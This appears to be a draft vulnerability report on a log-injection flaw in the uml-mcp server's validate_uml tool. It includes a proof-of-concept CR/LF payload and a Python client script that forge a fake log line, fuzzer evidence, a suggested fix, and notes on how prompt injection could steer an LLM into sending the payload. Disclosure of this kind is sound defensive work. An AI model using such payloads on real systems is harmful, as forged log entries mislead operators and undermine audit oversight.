# Log injection in `validate_uml`: CR/LF in `diagram_type` forges log lines

**Repository:** `antoinebou12/uml-mcp` · **Tool:** `validate_uml` · **Tested commit:** `e3c007d`
**Weakness:** CWE-117 Improper Output Neutralization for Logs

## Summary
`validate_uml` checks a diagram locally without rendering. Before it validates anything, it logs the caller's `diagram_type` at INFO level. The value is logged raw, so a `\r` or `\n` inside it starts a new line in the server log file and on stderr. A caller who can steer the arguments can add fake log entries. No network is needed.

## Details
`mcp_core/tools/diagram_tools.py:357-362` (tested commit):

```python
logger.info(
    "Called validate_uml tool: type=%s, code length=%s, strict=%s",
    diagram_type,
    len(code or ""),
    strict,
)
return validate_uml_inputs(diagram_type, code, output_format, strict=strict)
```

The type check happens inside `validate_uml_inputs`, after the log call. Logging is configured in `mcp_core/core/cli.py:44-77`: a file handler on `logs/uml_mcp_server_<date>.log` with the plain format `%(asctime)s - %(name)s - %(levelname)s - %(message)s`, and `RichHandler` on stderr. No handler escapes control characters.

## Steps to reproduce
1. Prerequisites: Python 3.12+, `uv`.
2. Install and start the server as the README describes:
   `git clone https://github.com/antoinebou12/uml-mcp.git && cd uml-mcp && git checkout e3c007d && uv sync`
3. Call the tool with:

   ```json
   {"diagram_type": "class\r\n2026-01-01 00:00:00,000 - mcp_core.tools.diagram_tools - INFO - FAKE-LOG-ENTRY", "code": "@startuml\nclass A\n@enduml"}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="uv", args=["run", "--directory", "/path/to/uml-mcp", "python", "server.py"])
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("validate_uml", {
                   "diagram_type": "class\r\n2026-01-01 00:00:00,000 - mcp_core.tools.diagram_tools - INFO - FAKE-LOG-ENTRY",
                   "code": "@startuml\nclass A\n@enduml",
               })
               print(result)

   asyncio.run(main())
   ```
4. Run `grep -n FAKE-LOG-ENTRY /path/to/uml-mcp/logs/uml_mcp_server_*.log`. The forged entry is on its own line.

## Expected behavior
`diagram_type` is escaped before logging (or logged only after it passed validation); one call gives one log line.

## Actual behavior
The value is logged raw. ToFu's log hook captured this from logger `mcp_core.tools.diagram_tools` (CR shown escaped; fuzzed bytes):

```
Called validate_uml tool: type="dia\x19\r\x1e\x12 \x0b\x06\x08e": "class", "code": "[link](http://127.0.0.1:8500)", "output_format": "svg", "strict": tru, code length=29, strict=True
```

The tool returned `Diagram is invalid; 1 diagnostic(s).`

## Impact
The LLM picks the arguments, and prompt injection can steer it. The attacker can add fake lines to the operator's log file and stderr. `validate_uml` is read-only and has no side effects, so it is an easy way to reach the log. Low severity.

## Suggested fix
Log `diagram_type` with `%r`, or add a `logging.Filter` / formatter that replaces `\r` and `\n` in log messages for all handlers.

## Status on the default branch
Still present at `c598429` (2026-09-29): the same call is at `mcp_core/tools/diagram_tools.py:361-366`. Logging moved to `mcp_core/observability/logging_setup.py`. The default `text` format still writes the raw message. Only `logging.format: json` escapes newlines.

## Prior reports
- #335 "feat: uml-mcp.yaml config, MXCP-style audit trail, rate limits, lint, local install, admin dashboard (includes #333, #334)" (PR, closed 2026-09-25; merged, its `docs/configuration/uml-mcp-yaml.md` is on the default branch): added the `logging.format: text | json` setting. Only the opt-in `json` format escapes newlines; the default `text` format still writes the raw message. Partial mitigation, not a fix.
- Documentation: docs/configuration/uml-mcp-yaml.md: "format: json  # text | json (one JSON object per line)" and docs/enterprise/operations.md: "`logging.format: json` (one object per line ...)" (document the JSON log format as an option; nothing says text logs are unsafe for untrusted input). SECURITY.md: "Validate all input coming from external sources" (general advice to operators).

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: log-injection (CWE-117), `check_introspection_log_injection` only.
- Campaigns and executions: corpus-sbx 3072 exec / 3072 ok (60 s); repo24-b 262656 / 262649 and 290304 / 290297 (4200 s each); e2-0922 1024 / 1024 (60 s).
- Evidence (verbatim, trimmed):
  - `{'diagram_type': '"dia\x19\r\x1e\x12 \x0b\x06\x08e": "class", "code": "[link](http://127.0.0.1:8500)", "output_format": "svg", "strict": tru', 'code': '[link](http://127.0.0.1:8500)', 'output_format': 'svg', 'strict': True}` -> `'Diagram is invalid; 1 diagnostic(s).'`, logged with a raw CR.
  - `{'diagram_type': '"diagram_type": "er", "code": "[link](:/if/le/et\x00\x00\x00\x00sswd)", "Output_format": "pdf", "s\x10\r\x16\x1ct": fals', ...}` -> `'Diagram is invalid; 3 diagnostic(s).'`, logged with a raw CR.
  - `{'diagram_type': '"diagram_typ]": "er", "cod"diagrae": "[link](file:///ef"S_]\x1b\x16\x1e\x18\ram_"t', ...}` -> same.
- Hand-check hints: real but low severity. Caller CR reaches `logger.info` with `%s` (confirmed at `diagram_tools.py:357-362`). The forged-entry payload is my substitution and was not run. Same pattern as the other uml-mcp tools; consider one combined issue.
</details>
